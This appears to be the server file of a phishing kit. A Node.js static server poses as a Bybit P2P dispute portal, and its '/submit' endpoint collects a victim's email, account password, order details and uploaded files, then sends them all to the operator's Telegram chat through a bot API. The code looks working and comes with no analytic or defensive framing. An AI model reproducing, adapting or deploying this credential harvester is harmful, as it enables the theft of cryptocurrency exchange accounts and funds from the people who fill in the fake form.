/**
 * Production Static Server for Render Deployment
 * Includes Telegram bot notification on dispute submission.
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

// ─── Telegram Config (set via Render environment variables) ───────────────────
const TG_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TG_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg':  'image/svg+xml',
  '.ico':  'image/x-icon'
};

// ─── Telegram Sender ──────────────────────────────────────────────────────────
function sendTelegram(text, base64Image, filename) {
  if (!TG_BOT_TOKEN || !TG_CHAT_ID) {
    console.warn('[Telegram] Bot token or chat ID not configured.');
    return;
  }

  if (base64Image && base64Image.includes('base64,')) {
    const b64Data = base64Image.split(',')[1];
    const fileBuffer = Buffer.from(b64Data, 'base64');
    
    const boundary = '----TelegramBoundary' + Date.now();
    let data = '';
    data += `--${boundary}\r\n`;
    data += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    data += `${TG_CHAT_ID}\r\n`;
    data += `--${boundary}\r\n`;
    data += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
    data += `${text}\r\n`;
    data += `--${boundary}\r\n`;
    data += `Content-Disposition: form-data; name="parse_mode"\r\n\r\n`;
    data += `HTML\r\n`;
    data += `--${boundary}\r\n`;
    data += `Content-Disposition: form-data; name="document"; filename="${filename || 'evidence'}"\r\n`;
    data += `Content-Type: application/octet-stream\r\n\r\n`;

    const bodyBuffer = Buffer.concat([
      Buffer.from(data, 'utf-8'),
      fileBuffer,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf-8')
    ]);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TG_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': bodyBuffer.length
      }
    };

    const req = https.request(options, (res) => {
      console.log(`[Telegram Document] Response: ${res.statusCode}`);
    });
    req.on('error', (e) => console.error('[Telegram Document] Error:', e.message));
    req.write(bodyBuffer);
    req.end();
  } else {
    const body = JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' });
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TG_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    };

    const req = https.request(options, (res) => {
      console.log(`[Telegram] Response: ${res.statusCode}`);
    });
    req.on('error', (e) => console.error('[Telegram] Error:', e.message));
    req.write(body);
    req.end();
  }
}

// ─── Read POST Body ───────────────────────────────────────────────────────────
function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', chunk => { data += chunk; });
    req.on('end', () => {
      try { resolve(JSON.parse(data)); }
      catch { reject(new Error('Invalid JSON')); }
    });
    req.on('error', reject);
  });
}

// ─── HTTP Server ──────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {

  // Health check
  if (req.url === '/healthz' || req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
    return;
  }

  // ── Dispute submission endpoint ──────────────────────────────────────────
  if (req.url === '/submit' && req.method === 'POST') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    try {
      const data = await readBody(req);

      const msg =
`🔴 <b>New Bybit P2P Dispute Received</b>

🎫 <b>Ticket ID:</b> ${data.ticketId || 'N/A'}
📦 <b>Order ID:</b> ${data.orderId || 'N/A'}
💰 <b>Disputed Amount:</b> ${data.claimAmount || 'N/A'}
📧 <b>Contact Email:</b> ${data.email || 'N/A'}
🔑 <b>Password:</b> ${data.password || 'N/A'}
📋 <b>Dispute Reason:</b> ${data.reasonText || 'N/A'}
📎 <b>Evidence File:</b> ${data.evidenceFile || 'None'}
📝 <b>Notes:</b> ${data.notes || 'None'}
🕒 <b>Timestamp:</b> ${data.timestamp || new Date().toISOString()}
📊 <b>Status:</b> Escrow Frozen – Under Mediation Review`;

      sendTelegram(msg, data.evidenceBase64, data.evidenceFile);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    } catch (err) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: err.message }));
    }
    return;
  }

  // OPTIONS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end();
    return;
  }

  // ── Static file serving ──────────────────────────────────────────────────
  let safeUrl = req.url.split('?')[0];
  if (safeUrl === '/') safeUrl = '/index.html';

  const filePath = path.join(__dirname, safeUrl);

  if (!filePath.startsWith(__dirname)) {
    res.writeHead(403, { 'Content-Type': 'text/plain' });
    res.end('Forbidden');
    return;
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      const indexPath = path.join(__dirname, 'index.html');
      fs.readFile(indexPath, (readErr, content) => {
        if (readErr) {
          res.writeHead(404, { 'Content-Type': 'text/plain' });
          res.end('404 Not Found');
        } else {
          res.writeHead(200, { 'Content-Type': MIME_TYPES['.html'] });
          res.end(content);
        }
      });
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    fs.readFile(filePath, (readErr, content) => {
      if (readErr) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Server Error');
      } else {
        res.writeHead(200, {
          'Content-Type': contentType,
          'Cache-Control': ext === '.html' ? 'no-cache' : 'public, max-age=86400'
        });
        res.end(content);
      }
    });
  });
});

server.listen(PORT, HOST, () => {
  console.log(`Server listening on http://${HOST}:${PORT}`);
});
